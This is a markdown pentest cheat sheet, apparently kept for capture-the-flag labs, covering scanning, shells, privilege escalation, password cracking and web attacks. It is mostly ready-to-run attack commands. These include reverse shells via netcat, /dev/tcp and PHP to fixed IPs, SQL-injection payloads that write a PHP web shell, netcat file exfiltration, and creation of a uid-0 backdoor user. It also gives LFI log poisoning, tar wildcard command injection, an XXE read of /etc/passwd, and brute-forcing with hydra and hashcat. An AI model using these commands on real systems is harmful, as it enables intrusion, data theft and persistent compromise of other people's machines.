# HACK NOTES

- [HACK NOTES](#hack-notes)
	- [Scan](#scan)
		- [Port Scanning](#port-scanning)
		- [FTP Port 21](#ftp-port-21)
		- [SNMP Port 161](#snmp-port-161)
		- [Web Port 80, 443](#web-port-80-443)
			- [FeroxBuster](#feroxbuster)
		- [MySQL Port 3306 & MsSQL Port 1433](#mysql-port-3306--mssql-port-1433)
		- [SMB Port 445,139 & RPC Port 111,135](#smb-port-445139--rpc-port-111135)
	- [SHELL](#shell)
		- [Stable Shell](#stable-shell)
		- [Reverse shell](#reverse-shell)
		- [Shell from SQL injection](#shell-from-sql-injection)
		- [python Spawn shell](#python-spawn-shell)
	- [Post Exploitation](#post-exploitation)
	- [Words list generator](#words-list-generator)
	- [Hash](#hash)
	- [PrivEsc](#privesc)
		- [GTFOBin](#gtfobin)
		- [sudo -l](#sudo--l)
		- [LinPeas](#linpeas)
	- [Enum](#enum)
		- [List SUID files](#list-suid-files)
		- [List writable folders](#list-writable-folders)
		- [List of executable binaries](#list-of-executable-binaries)
		- [Netcat](#netcat)
	- [SSH](#ssh)
	- [Password Hack](#password-hack)
		- [Hydra](#hydra)
		- [JohnTheRipper](#johntheripper)
		- [Hashcat](#hashcat)
	- [Steganography](#steganography)
	- [SQLMAP](#sqlmap)
	- [pwncat](#pwncat)
		- [track modifications](#track-modifications)
	- [Wifite](#wifite)
	- [wpscan](#wpscan)
	- [Meterpreter Windows PrivEsc](#meterpreter-windows-privesc)
		- [GetSystem](#getsystem)
		- [Meterpreter shell](#meterpreter-shell)
	- [LFI](#lfi)
		- [Fuzz](#fuzz)
		- [View php code](#view-php-code)
		- [View access.log](#view-accesslog)
		- [Command injection](#command-injection)
	- [SSTI](#ssti)
	- [XML external entity (XXE) injection](#xml-external-entity-xxe-injection)
	- [TAR Wildcards](#tar-wildcards)
	- [Websites](#websites)

## Scan

### Port Scanning

```sh
nmap -sC -sV -oN nmap/initial $IP
nmap -sC -sV -p- -oN nmap/all_ports $IP
nmap -Pn -sT -sU -p $ports --script=*vuln* -vv -oN nmap/vuln $IP
```

### FTP Port 21

```sh
nmap -p 21 --script="+*ftp* and not brute and not dos and not fuzzer" -vv -oN nmap/ftp $IP
hydra -s 21 -C /usr/share/.../passwords -u -f $IP ftp
```

### SNMP Port 161

```sh
snmpwalk -c public -v1 $IP
snmp-check $IP
snmpcheck -t $IP -c public
```

### Web Port 80, 443

```sh
nikto -h http://$IP/
gobuster dir -e -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/common.txt
gobuster dir -e -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x ext,ext2,ext3
wfuzz --hc 404 -c -w /usr/share/seclists/Discovery/Web-Content/common.txt http://$IP/FUZZ.txt
wfuzz -c --hc 403  -u http://paper -H "Host: FUZZ.paper" -w /usr/share/wfuzz/wordlist/general/common.txt
wfuzz -u http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/FUZZ/cmdline -z range,1-1000 --hw 1
ffuf -fc 403 -w /usr/share/wfuzz/wordlist/general/common.txt -u http://paper/ -H "Host: FUZZ.paper"
```

#### FeroxBuster

```sh
sudo apt update && sudo apt install -y feroxbuster

feroxbuster -e -d0 --url url
```

### MySQL Port 3306 & MsSQL Port 1433

```sh
nmap -p 3306 --script="+*mysql* and not brute and not dos and not fuzzer" -vv -oN nmap/mysql $IP
```

### SMB Port 445,139 & RPC Port 111,135

```sh
enum4linux -a $IP
nmap -p 139,445 192.168.1.1/24 --script smb-enum-shares.nse smb-os-discovery.nse
nmap --script rpcinfo.nse $IP -p 111
rpcclient -U "" -N
smbclient -L $IP
smbclient \\\\hack.thm\\websvr
showmount -e $IP
smbmap -H hack.thm -R 
smbmap -H $IP -d <domain> -u <user> -p <password>
mount -t cifs //$IP/<share> <local dir> -o username="guest", password=""
```

## SHELL

### Stable Shell

```sh
python -c 'import pty;pty.spawn("/bin/bash")'
OR
python3 -c 'import pty;pty.spawn("/bin/bash")'

export TERM=xterm
CTRL+Z
stty raw -echo; fg
[2xENTER]

```sh
alias ll='ls -lah --color'
```

### Reverse shell

```sh
rm /tmp/f ; mkfifo /tmp/f ; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.9.129.247 1234 >/tmp/f
```

```sh
/bin/bash -c '/bin/bash -i >& /dev/tcp/10.9.129.247/1234 0>&1'
```

```sh
nc -nv 10.11.55.28 1234 -e /bin/bash
```

### Shell from SQL injection

- Windows

```sql
?id=1 union all select 1,2,3,4,""<?php echo shell_exec($_GET['cmd']);?>"",6,7,8,9 into OUTFILE 'c:/xampp/htdocs/cmd.php'
```

- Linux

```sql
?id=1 union all select 1,2,3,4,""<?php echo shell_exec($_GET['cmd']);?>"",6,7,8,9 into OUTFILE '/var/www/html/cmd.php'
```

### python Spawn shell

```python
import pty; pty.spawn("/bin/sh")
```

## Post Exploitation

```sh
unshadow passwd.txt shadow.txt > passwords.txt
sudo useradd -ou 0 -g 0 john | sudo passwd John@1234
```

```sh
Attacker side:
nc -l -p 4444 -q 1 > file < /dev/null

Victim side:
nc <attacker ip> 4444 < file
```

```sh
python -m http.server
python -m SimpleHTTPServer
```

## Words list generator

```sh
cewl -w wordslist.txt -d 10 http://$IP
```

## Hash

- hash-identifier
- hashid

## PrivEsc

### GTFOBin

<https://gtfobins.github.io/>

### sudo -l

- (ALL, !root) /bin/bash

```sh
sudo -u#-1 /bin/bash
```

### LinPeas

<https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite>

## Enum

### List SUID files

```sh
find / -perm /4000 2>/dev/null
```

### List writable folders

```sh
find / -type d -writable 2> /dev/null
```

### List of executable binaries

```sh
find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 6 -exec ls -ld {} \; 2>/dev/null
```

### Netcat

```sh
netcat -l
```

If 127.0.0.1:6666

- On attacker

```sh
apt-get install chisel
# Copy chisel to victim
chisel server --reverse --port 9002
```

- On victim

```sh
./chisel client 10.9.129.247:9002 R:9001:127.0.0.1:6666
```

- On attacker, go to `localhost:9001`

## SSH

* -L: Direct Redirect
* -D: SOCKS Redirect
* -N: Do not connect

Redirect localhost to victim host
```bash
ssh -N -L 8080:hack.thm:8080 localhost
```

## Password Hack

### Hydra

```sh
hydra -f -t 4 -l user -P /usr/share/wordlists/rockyou.txt ssh://$IP
```

```sh
hydra -l admin -P /usr/share/wordlists/rockyou.txt $IP http-post-form "/admin/:user=^USER^&pass=^PASS^:Username or password invalid"
```

### JohnTheRipper

- ssh private key

```sh
/usr/share/john/ssh2john.py [ssh_file] > forjohn
john --wordlist=wordlist.txt forjohn
```

### Hashcat

- MD5 Wordlist

```sh
hashcat -a 0 -m 0 "42f749ade7f9e195bf475f37a44cafcb" /usr/share/wordlists/rockyou.txt
```

- MD5 bruteforce
  
```sh
hashcat -a 3 -m 0 "48bb6e862e54f2a795ffc4e541caed4d" ?a?a?a?a --show
```

## Steganography

```sh
steghide extract -sf file.jpg
```

```sh
stegcracker file.jpg
```

```sh
binwalk file
binwalk -e file
```

## SQLMAP

<https://github.com/sqlmapproject/sqlmap.git>

```sh
sqlmap.py -u "http://www.truc.com/index.php" --form
sqlmap.py -u "http://www.truc.com/index.php" --data "[post data]"
sqlmap.py -u "http://www.truc.com/index.php" --data "[post data]" --dump
```

```sh
sqlmap --url http://www.truc.com/index.php?dvwa/vulnerabilities/sqli/?id=1\&Submit=Submit# --cookie='security=low; PHPSESSID=dqsqdqsdfzefv' --dbs
sqlmap --url http://www.truc.com/index.php?dvwa/vulnerabilities/sqli/?id=1\&Submit=Submit# --cookie='security=low; PHPSESSID=dqsqdqsdfzefv' --tables -D dvwa
sqlmap --url http://www.truc.com/index.php?dvwa/vulnerabilities/sqli/?id=1\&Submit=Submit# --cookie='security=low; PHPSESSID=dqsqdqsdfzefv' --columns -D dvwa -T users
sqlmap --url http://www.truc.com/index.php?dvwa/vulnerabilities/sqli/?id=1\&Submit=Submit# --cookie='security=low; PHPSESSID=dqsqdqsdfzefv' --dump -D dvwa -T users
```

```sh
--form
--form --dbs
--form --tables -D [database]
--form --columns -D [database] -T [table]
--form --dump -D [database] -T [table]
```

## pwncat

```sh
python3 -m venv pwncat-env
source pwncat-env/bin/activate
pip install pwncat-cs
```

```sh
pwncat-cs
listen -m linux 1234
sessions
sessions 0
ctrl+d
```

### track modifications

```sh
tamper
tamper --revert --all

source env/bin/activate
pwncat user@IP
run enumerate.gather
run escalate.auto
run escalate.auto exec
```

## Wifite

```sh
sudo wifite --wpa --dict file.txt --kill
```

## wpscan

```sh
wpscan --url $IP/wordpress -e at
wpscan --url $IP/wordpress -e ap
wpscan --url $IP/wordpress -e u
wpscan --url $IP/wordpress --enumerate
wpscan --url $IP/wordpress -U users.txt -P /usr/share/wordlists/rockyou.txt
```

## Meterpreter Windows PrivEsc

### GetSystem

```sh
use priv
getsystem
getuid
```

### Meterpreter shell

```sh
^Z
search shell_to_meterpreter
use 0
options
set SESSION 1
run
sessions
sessions -i 2
```

## LFI

### Fuzz

```sh
wfuzz --hw 0 -c -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt http://$IP/page=../../../../../../../../..FUZZ
```

### View php code

```sh
=php://filter/convert.base64-encode/resource=page.php
```

### View access.log

```sh
=/var/www/html/development_testing/../../../../var/log/apache2/access.log
```

### Command injection

- Capture the request in BurpSuite and then send it to Repeater Tab
- Reload page with the User-Agent replaced with this php code: `<?php system($_GET[‘cmd’]);?>`
- Modifiy the get request
  
```sh
GET /test.php?view=/var/www/html/development_testing/..//..//..//..//var/log/apache2/access.log&cmd=whoami HTTP/1.1
```

- Use the following reverse shell in cmd= (ctrl+u to encode it)
  
```sh
php -r '$sock=fsockopen("10.9.129.247",1234);exec("/bin/sh -i <&3 >&3 2>&3");
```

## SSTI

Server-Side Template Injection
![SSTI](images/ssti.png)

## XML external entity (XXE) injection

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

## TAR Wildcards

In case of CRON like  
`*/1 *   * * *   root tar -zcf /var/backups/html.tgz /var/www/html/*`

Payload generation
```sh
msfvenom -p cmd/unix/reverse_netcat lhost=192.168.1.10 lport=8888 R
```

```sh
echo "mkfifo /tmp/lhennp; nc 192.168.1.102 8888 0</tmp/lhennp | /bin/sh >/tmp/lhennp 2>&1; rm /tmp/lhennp" > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
```

## Websites

- <https://crackstation.net/>
- <https://gchq.github.io/CyberChef/>
- <http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet>
- <https://github.com/internetwache/GitTools>
- <https://hashes.com/en/decrypt/hash>
- <https://md5decrypt.net/en/>
- <https://github.com/swisskyrepo/PayloadsAllTheThings>
- <https://dnsdumpster.com>
- <https://www.shodan.io>
